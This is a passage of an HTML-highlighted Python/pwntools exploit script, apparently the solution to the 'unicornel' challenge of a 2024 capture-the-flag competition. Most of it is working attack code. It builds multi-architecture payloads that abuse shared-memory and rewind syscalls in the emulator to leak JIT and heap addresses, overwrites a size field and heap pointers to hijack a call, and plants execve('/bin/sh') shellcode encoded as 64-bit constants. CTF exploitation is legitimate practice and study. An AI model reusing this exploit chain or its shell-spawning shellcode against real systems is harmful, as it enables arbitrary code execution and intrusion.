</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #</span><span style="color:#e6db74">{</span>print_integer<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rewind_aarch64</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, #</span><span style="color:#e6db74">{</span>unicornel_rewind<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pause_arm</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #</span><span style="color:#e6db74">{</span>unicornel_pause<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rewind_arm</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #</span><span style="color:#e6db74">{</span>unicornel_rewind<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_return_value_arm</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, r0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, </span><span style="color:#e6db74">{</span>print_integer<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">save_ctx_arm</span>():
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #</span><span style="color:#e6db74">{</span>bookmark<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">resume_arm</span>(pid):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #</span><span style="color:#e6db74">{</span>unicornel_resume<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, #</span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">map_shared_arm</span>(address, length, handle):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r0, #</span><span style="color:#e6db74">{</span>map_shared<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r1, #</span><span style="color:#e6db74">{</span>address<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r2, #</span><span style="color:#e6db74">{</span>length<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r3, #</span><span style="color:#e6db74">{</span>handle<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    svc 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    REMOTE <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> REMOTE:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;unicornel.2024.ctfcompetition.com&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;You can run the solver with:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;bash -c &#39;&#34;</span> <span style="color:#f92672">+</span> (p<span style="color:#f92672">.</span>recvline()[<span style="color:#ae81ff">4</span>:])<span style="color:#f92672">.</span>decode() <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> (os<span style="color:#f92672">.</span>popen(cmd)<span style="color:#f92672">.</span>read())
</span></span><span style="display:flex;"><span>        p<span style="color:#f92672">.</span>sendline(result<span style="color:#f92672">.</span>split ()[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>        log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;POW finished&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./chal&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./chal&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pid 0</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;mov sp, #0x2000</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> save_ctx_aarch64()
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> pause_aarch64()
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> map_shared_aarch64(<span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> resume_aarch64(<span style="color:#ae81ff">1</span>) 
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> rewind_aarch64()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> asm_aarch64(code)
</span></span><span style="display:flex;"><span>    SEND_ELF(UC_ARCH_ARM64, UC_MODE_ARM, len(payload))
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;with pid &#39;</span>)
</span></span><span style="display:flex;"><span>    pid <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;created process - </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pid 1</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;mov rsp, 0x2000</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;retry:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> create_shared_x86(<span style="color:#ae81ff">0x000000000005000</span>)
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> resume_x86(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> pause_x86()
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> map_shared_x86(<span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0</span>) <span style="color:#75715e"># handle 0</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov rdi, 0x5000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rax, [rdi]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    cmp rax, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    jne success
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> unmap_shared_x86()
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;jmp retry</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;success:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> write_x86(<span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0x40</span>)
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> write_x86(<span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> pause_x86() <span style="color:#75715e"># exploit phase 2 aaw</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;jmp 0x7000</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># shared memory - shellcode start</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># maybe RVA? 0x7000 not working</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> asm_x86_64(code)
</span></span><span style="display:flex;"><span>    SEND_ELF(UC_ARCH_X86, UC_MODE_64, len(payload))
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(payload)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;with pid &#39;</span>)
</span></span><span style="display:flex;"><span>    pid <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;created process - </span><span style="color:#e6db74">{</span>pid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x40</span>)
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> u64(rv[:<span style="color:#ae81ff">8</span>])
</span></span><span style="display:flex;"><span>    thread_heap <span style="color:#f92672">=</span> u64(rv[<span style="color:#ae81ff">16</span>:<span style="color:#ae81ff">24</span>])
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;thread heap: &#34;</span> <span style="color:#f92672">+</span> hex(thread_heap))
</span></span><span style="display:flex;"><span>    JIT <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x720</span>
</span></span><span style="display:flex;"><span>    heap_leak <span style="color:#f92672">=</span> u64(rv[<span style="color:#ae81ff">0x10</span>:<span style="color:#ae81ff">0x18</span>]) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1e820</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> JIT <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;JIT: &#34;</span><span style="color:#f92672">+</span>hex(JIT))
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;heap target: &#34;</span><span style="color:#f92672">+</span>hex(heap_leak)) 
</span></span><span style="display:flex;"><span>    rv <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> u64(rv[:<span style="color:#ae81ff">8</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> leak<span style="color:#f92672">-</span><span style="color:#ae81ff">0x720</span> <span style="color:#f92672">!=</span> JIT: <span style="color:#75715e"># leak + 0x720</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pid 2</span>
</span></span><span style="display:flex;"><span>    x86_code <span style="color:#f92672">=</span> write_x86(<span style="color:#ae81ff">0x3000</span>, <span style="color:#ae81ff">0x20</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode = []</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode.append(u64(asm(&#39;&#39;&#39;\</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># push   0x68732f</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pop    rax</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># jmp    $+0x8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &#39;&#39;&#39;).ljust(8,b&#39;\x00&#39;)))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode.append(u64(asm(&#39;&#39;&#39;\</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># push   0x6e69622f</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pop    rdx</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># jmp    $+0x8                                  </span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &#39;&#39;&#39;).ljust(8,b&#39;\x00&#39;)))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode.append(u64(asm(&#39;&#39;&#39;\</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shl    rax,0x20</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># xor    esi,esi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># jmp    $+0x8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &#39;&#39;&#39;).ljust(8,b&#39;\x00&#39;)))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode.append(u64(asm(&#39;&#39;&#39;\</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># add    rax,rdx</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># xor    edx,edx</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># push   rax</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># jmp    $+0x8</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &#39;&#39;&#39;).ljust(8,b&#39;\x00&#39;)))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># shellcode.append(u64(asm(&#39;&#39;&#39;\</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># mov    rdi,rsp</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># push   0x3b</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># pop    rax</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># syscall </span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># &#39;&#39;&#39;).ljust(8,b&#39;\x00&#39;)))</span>
</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> [<span style="color:#ae81ff">498588942530195304</span>, <span style="color:#ae81ff">498591614015516520</span>, <span style="color:#ae81ff">498762874620002632</span>, <span style="color:#ae81ff">498581047463641416</span>, <span style="color:#ae81ff">364607107060173128</span>]
</span></span><span style="display:flex;"><span>    print(shellcode)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    x86_code <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">        movq r9, 0xcafebabecafebabe
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movq r10, </span><span style="color:#e6db74">{</span>hex(shellcode[<span style="color:#ae81ff">0</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movq r11, </span><span style="color:#e6db74">{</span>hex(shellcode[<span style="color:#ae81ff">1</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movq r12, </span><span style="color:#e6db74">{</span>hex(shellcode[<span style="color:#ae81ff">2</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movq r13, </span><span style="color:#e6db74">{</span>hex(shellcode[<span style="color:#ae81ff">3</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movq r14, </span><span style="color:#e6db74">{</span>hex(shellcode[<span style="color:#ae81ff">4</span>])<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    x86_code <span style="color:#f92672">+=</span> save_ctx_x86()
</span></span><span style="display:flex;"><span>    x86_code <span style="color:#f92672">+=</span> resume_x86(<span style="color:#ae81ff">2</span>) <span style="color:#75715e"># go</span>
</span></span><span style="display:flex;"><span>    x86_code <span style="color:#f92672">+=</span> pause_x86() 
</span></span><span style="display:flex;"><span>    x86_code <span style="color:#f92672">+=</span> rewind_x86()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    x86_payload <span style="color:#f92672">=</span> asm_x86_64(x86_code)
</span></span><span style="display:flex;"><span>    x86_payload <span style="color:#f92672">=</span> x86_payload<span style="color:#f92672">.</span>ljust((len(x86_code)<span style="color:#f92672">//</span><span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>    stub <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;mov r0, 0x8000</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(x86_code)<span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        stub <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ldr r1, = </span><span style="color:#e6db74">{</span>u32(x86_payload[<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i:<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span>i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>])<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        stub <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;str r1, [r0]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>        stub <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;add r0, r0, #4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;mov sp, #0x2000</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> map_shared_arm(<span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0x5000</span>, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> print_return_value_arm()
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> stub
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> resume_arm(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> pause_arm() <span style="color:#75715e"># go target</span>
</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x2c0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span> 
</span></span><span style="display:flex;"><span>    target1 <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x90</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>    jump <span style="color:#f92672">=</span> JIT <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xddb</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    ldr r1, = </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x3000</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, = </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x5190</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0] // size overwrite
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, = </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x51a0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, = </span><span style="color:#e6db74">{</span>target1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r2, = </span><span style="color:#e6db74">{</span>target1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r0, r0, #4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r2, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, = </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x51a0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, = </span><span style="color:#e6db74">{</span>jump <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r2, = </span><span style="color:#e6db74">{</span>jump <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r0, r0, #4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r2, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r0, = </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0x51a0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1b38</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r1, = </span><span style="color:#e6db74">{</span>target <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr r2, = </span><span style="color:#e6db74">{</span>target <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">32</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r1, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add r0, r0, #4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str r2, [r0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">+=</span> resume_arm(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        0x559c69a119a8 4c89ef              &lt;cpu_exec_x86_64+0x288&gt;   mov    rdi, r13 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    -&gt; 0x559c69a119ab 488b80c0020000      &lt;cpu_exec_x86_64+0x28b&gt;   mov    rax, QWORD PTR [rax + 0x2c0] 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        0x559c69a119b2 ff9090000000        &lt;cpu_exec_x86_64+0x292&gt;   call   QWORD PTR [rax + 0x90] 
